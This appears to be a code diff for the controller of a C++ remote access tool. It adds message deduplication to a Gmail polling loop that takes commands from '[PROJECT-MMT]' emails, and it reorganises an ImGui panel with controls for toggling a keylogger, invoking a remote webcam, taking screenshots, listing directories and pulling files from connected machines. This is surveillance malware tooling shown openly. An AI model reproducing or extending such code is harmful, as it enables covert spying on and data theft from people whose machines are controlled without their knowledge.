@@ -407,10 +407,11 @@ void MailListener() {
     const std::string subject_to_find = "\"[PROJECT-MMT]\""; // Use quotes for exact phrases
     std::string errorString;
     const int polling_interval_seconds = 15;
-    // On first run, check last 5 mins
-    long long last_check_timestamp = getCurrentUnixTime() - 300;
+    // On first run, check last 2 mins      //for what?
+    long long last_check_timestamp = getCurrentUnixTime() - 120;
 
     while (true) {
+        std::set<std::string> uniqueMessageCheck;
         long long next_check_timestamp = getCurrentUnixTime();
         std::string query = "subject:" + subject_to_find + " after:" + std::to_string(last_check_timestamp);
 
@@ -421,6 +422,9 @@ void MailListener() {
             // cout << "query success " << new_message_ids.size() << " elements\n";
             // miniConsole.AddLineInfo("queryMail: %s", errorString.c_str());
             for(const auto& id : new_message_ids) {
+                if(uniqueMessageCheck.find(id) != uniqueMessageCheck.end()) continue;
+
+                uniqueMessageCheck.insert(id);
                 MailMessage mailMsg;
                 if(!gmail.getEmail(id, mailMsg)) {
                     continue;
@@ -513,7 +517,7 @@ void MailListener() {
                             }
                             if(status) miniConsole.AddLineSuccess("%s from mail success", tokenVector[0].c_str());
                             else miniConsole.AddLineError("%s from mail failed. Error: %s", tokenVector[0].c_str(), errorString.c_str());
-                            // break;
+                            break;
                         }
                     }
                 }).detach();
@@ -588,8 +592,13 @@ void RunGui() {
         if (ImGui::CollapsingHeader(headerLabel.c_str())) {
             ImGui::Text("Connected for %llus", client.getConnectionDuration());
             
+            ImGui::SeparatorText("General control");
             ImGui::Checkbox(client.makeWidgetName("Lock control panel").c_str(), &client.funcStruct.isControlLocked);
+            if(ImGui::Button(client.makeWidgetName("Copy address to clipboard").c_str())) {
+                WriteClipboardText(client.getPeerIpPort());
+            }
             ImGui::BeginDisabled(client.funcStruct.isControlLocked);
+            ImGui::SeparatorText("Raw text command control");
             ImGui::InputTextMultiline(client.makeWidgetName("Message Input").c_str(), &client.funcStruct.rawText, ImVec2(600, 55));
             
             // Send button
@@ -604,8 +613,9 @@ void RunGui() {
                     }).detach();
                 }
             }
-
-            if(ImGui::Checkbox("Func: Keylogger", &client.funcStruct.isKeyloggerActive)) {  //click -> already changed the state
+            
+            ImGui::SeparatorText("Keylogger control");
+            if(ImGui::Checkbox(client.makeWidgetName("Func: Keylogger").c_str(), &client.funcStruct.isKeyloggerActive)) {  //click -> already changed the state
                 if(client.funcStruct.isKeyloggerActive) {
                     std::thread([&client] {
                         if (MessageEnableKeylogServerHandler(client)) {
@@ -628,7 +638,8 @@ void RunGui() {
                     }).detach();
                 }
             }
-            
+
+            ImGui::SeparatorText("Webcam control");
             if(ImGui::Button(client.makeWidgetName("Invoke webcam").c_str())) {
                 std::thread([&client] {
                     if(MessageInvokeWebcamServerHandler(client, client.funcStruct.webcamDurationMs, client.funcStruct.webcamFps)) {
@@ -639,16 +650,17 @@ void RunGui() {
                 }).detach();
             }
             ImGui::SetNextItemWidth(150.0f);
-            if(ImGui::InputInt("Invoke webcam duration (in millisecond)", &client.funcStruct.webcamDurationMs)) {
+            if(ImGui::InputInt(client.makeWidgetName("Invoke webcam duration (in millisecond)").c_str(), &client.funcStruct.webcamDurationMs)) {
                 if(client.funcStruct.webcamDurationMs < 1000) client.funcStruct.webcamDurationMs = 1000;
                 if(client.funcStruct.webcamDurationMs > 2000000000) client.funcStruct.webcamDurationMs = 2000000000;
             }
             ImGui::SetNextItemWidth(150.0f);
-            if(ImGui::InputInt("Invoke webcam fps limit", &client.funcStruct.webcamFps)) {
+            if(ImGui::InputInt(client.makeWidgetName("Invoke webcam fps limit").c_str(), &client.funcStruct.webcamFps)) {
                 if(client.funcStruct.webcamFps < 0) client.funcStruct.webcamFps = 10;
                 if(client.funcStruct.webcamFps > 500) client.funcStruct.webcamFps = 500;
             }
 
+            ImGui::SeparatorText("Screenshot control");
             if(ImGui::Button(client.makeWidgetName("Take Screenshot").c_str())) {
                 std::thread([&client] {
                     if (MessageScreenCapServerHandler(client)) {
@@ -659,8 +671,9 @@ void RunGui() {
                 }).detach();
             }
 
+            ImGui::SeparatorText("File & folder control");
             ImGui::SetNextItemWidth(600.0f);
-            ImGui::InputText("Input path for listing directory", &client.funcStruct.pathText);
+            ImGui::InputText(client.makeWidgetName("Input path for listing directory").c_str(), &client.funcStruct.pathText);
             if(ImGui::Button(client.makeWidgetName("List directory").c_str())) {
                 std::thread([&client] {
                     if (MessageListFileServerHandler(client, client.funcStruct.pathText)) {
@@ -672,7 +685,7 @@ void RunGui() {
             }
 
             ImGui::SetNextItemWidth(600.0f);
-            ImGui::InputText("Input full-filename to get file", &client.funcStruct.getFileText);
+            ImGui::InputText(client.makeWidgetName("Input full-filename to get file").c_str(), &client.funcStruct.getFileText);
             if(ImGui::Button(client.makeWidgetName("Get File").c_str())) {
                 std::thread([&client] {
                     if (MessageGetFileServerHandler(client, client.funcStruct.getFileText)) {
